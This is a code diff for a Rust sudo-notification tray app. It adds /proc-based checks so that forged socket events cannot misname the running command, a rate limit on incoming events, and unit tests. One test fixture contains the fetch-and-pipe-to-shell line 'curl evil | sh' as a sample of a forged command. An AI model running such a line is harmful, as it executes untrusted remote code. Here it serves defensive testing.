@@ -21,7 +21,7 @@ use crate::tray::{Cmd, CmdSink, ICONS, SudoTray};
 use ksni::blocking::TrayMethods;
 use std::fs;
 use std::io::Read;
-use std::os::unix::fs::DirBuilderExt;
+use std::os::unix::fs::{DirBuilderExt, MetadataExt};
 use std::path::{Path, PathBuf};
 use std::process::{Child, Command, Stdio};
 use std::sync::Arc;
@@ -123,13 +123,57 @@ fn write_icons(runtime: &Path) -> String {
     dir.to_string_lossy().into_owned()
 }
 
+/// At most this many events per window reach the main loop (a real sudo sends two or three).
+const LISTEN_MAX: u32 = 60;
+const LISTEN_WINDOW: Duration = Duration::from_secs(10);
+
+/// An event as sent is anybody's (any process of this user can write the socket); what sudo is
+/// doing is the kernel's. When `/proc/<pid>` is readable: it must be a `sudo` of this user, and
+/// its own command line replaces the one in the event, so a forged datagram cannot make a
+/// notification name a command that is not the one running. Unreadable (gone, or `hidepid`): the
+/// event as sent, which is all there is.
+fn checked(mut e: Event, proc_root: &Path) -> Option<Event> {
+    let dir = proc_root.join(e.sudo_pid.to_string());
+    let Ok(argv) = fs::read(dir.join("cmdline")) else {
+        return Some(e);
+    };
+    let me = fs::metadata(proc_root.join("self")).map(|m| m.uid()).ok();
+    let theirs = fs::read_to_string(dir.join("status")).ok().and_then(|s| {
+        s.lines()
+            .find_map(|l| l.strip_prefix("Uid:"))
+            .and_then(|v| v.split_whitespace().next()?.parse::<u32>().ok())
+    });
+    let words: Vec<&[u8]> = argv
+        .strip_suffix(b"\0")
+        .unwrap_or(&argv)
+        .split(|b| *b == 0)
+        .collect();
+    let is_sudo = words
+        .first()
+        .and_then(|w| w.rsplit(|b| *b == b'/').next())
+        .is_some_and(|b| b == b"sudo");
+    if !is_sudo || (me.is_some() && theirs.is_some() && me != theirs) {
+        return None;
+    }
+    let joined = words.join(&b' ');
+    e.command = crate::text::clean(&String::from_utf8_lossy(&joined), crate::event::MAX_COMMAND);
+    Some(e)
+}
+
 fn open_window(child: &mut Option<Child>) {
     if let Some(c) = child
         && matches!(c.try_wait(), Ok(None))
     {
         return; // already open
     }
-    *child = std::env::current_exe().ok().and_then(|exe| {
+    // After a package upgrade the running binary reads as "<path> (deleted)": the new one is at
+    // the same path without the suffix.
+    let exe = std::env::current_exe().ok().map(|p| {
+        let s = p.to_string_lossy();
+        s.strip_suffix(" (deleted)")
+            .map_or_else(|| p.clone(), PathBuf::from)
+    });
+    *child = exe.and_then(|exe| {
         Command::new(exe)
             .arg("window")
             .stdin(Stdio::null())
@@ -149,10 +193,20 @@ struct Checks {
 }
 
 pub fn run(env: Env) -> i32 {
-    let Some(runtime) = paths::runtime_dir(env) else {
-        eprintln!("sudostamp-desktop: XDG_RUNTIME_DIR is not set: no login session, nothing to do");
+    let Ok(uid) = fs::metadata("/proc/self").map(|m| m.uid()) else {
+        eprintln!("sudostamp-desktop: cannot tell who I am (/proc)");
         return 1;
     };
+    let runtime = paths::runtime_dir(uid);
+    if !runtime.parent().is_some_and(Path::is_dir) {
+        eprintln!(
+            "sudostamp-desktop: {} does not exist: no login session, nothing to do",
+            runtime
+                .parent()
+                .map_or_else(String::new, |p| p.display().to_string())
+        );
+        return 1;
+    }
     let sock_path = paths::socket(&runtime);
     let sock = match listener::bind(&runtime, &sock_path) {
         Ok(Bind::Bound(s)) => s,
@@ -180,8 +234,26 @@ pub fn run(env: Env) -> i32 {
 
     let (tx, rx) = mpsc::channel::<Msg>();
     {
+        // Any process of this user can write the socket: a flood must cost bounded memory and
+        // never hold up the menu, so events beyond a sudo's worth are dropped HERE, before they
+        // are queued (the engine's own limit only applies to what it is handed).
         let tx = tx.clone();
-        thread::spawn(move || listener::serve(&sock, |e| tx.send(Msg::Event(e)).is_ok()));
+        let mut window = (Instant::now(), 0u32);
+        thread::spawn(move || {
+            listener::serve(&sock, |e| {
+                if window.0.elapsed() >= LISTEN_WINDOW {
+                    window = (Instant::now(), 0);
+                }
+                window.1 += 1;
+                if window.1 > LISTEN_MAX {
+                    return true;
+                }
+                let Some(e) = checked(e, Path::new("/proc")) else {
+                    return true;
+                };
+                tx.send(Msg::Event(e)).is_ok()
+            });
+        });
     }
     let (ntx, nrx) = mpsc::channel();
     thread::spawn(move || notify::run(&nrx));
@@ -351,4 +423,44 @@ pub fn run(env: Env) -> i32 {
         drop(h.shutdown());
     }
     0
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::event::Kind;
+    use crate::track::fake::Proc;
+
+    fn asking(pid: u32, command: &str) -> Event {
+        Event {
+            kind: Kind::Asking,
+            sudo_pid: pid,
+            tty: String::new(),
+            command: command.into(),
+            phone: String::new(),
+            ts: 0,
+        }
+    }
+
+    #[test]
+    fn a_forged_command_is_replaced_by_what_sudo_is_running() {
+        let p = Proc::new("checked-forge");
+        p.cmdline(4242, &["sudo", "sh", "-c", "curl evil | sh"]);
+        let e = checked(asking(4242, "sudo apt update"), p.root()).expect("a sudo");
+        assert_eq!(e.command, "sudo sh -c curl evil | sh");
+    }
+
+    #[test]
+    fn an_event_naming_a_process_that_is_not_sudo_is_dropped() {
+        let p = Proc::new("checked-notsudo");
+        p.cmdline(77, &["/usr/bin/python3", "x.py"]);
+        assert!(checked(asking(77, "sudo true"), p.root()).is_none());
+    }
+
+    #[test]
+    fn an_unreadable_process_keeps_the_event_as_sent() {
+        let p = Proc::new("checked-gone");
+        let e = checked(asking(99, "sudo id"), p.root()).expect("kept");
+        assert_eq!(e.command, "sudo id");
+    }
 }
